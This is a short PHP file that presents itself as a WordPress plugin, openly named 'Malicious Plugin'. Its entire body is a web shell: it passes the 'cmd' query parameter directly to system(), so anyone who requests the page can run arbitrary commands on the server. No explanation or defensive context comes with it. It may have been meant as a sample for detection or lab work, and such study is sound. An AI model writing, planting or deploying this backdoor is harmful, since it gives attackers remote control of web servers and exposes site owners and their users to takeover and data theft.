<?php
/*
Plugin Name: Malicious Plugin
*/
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>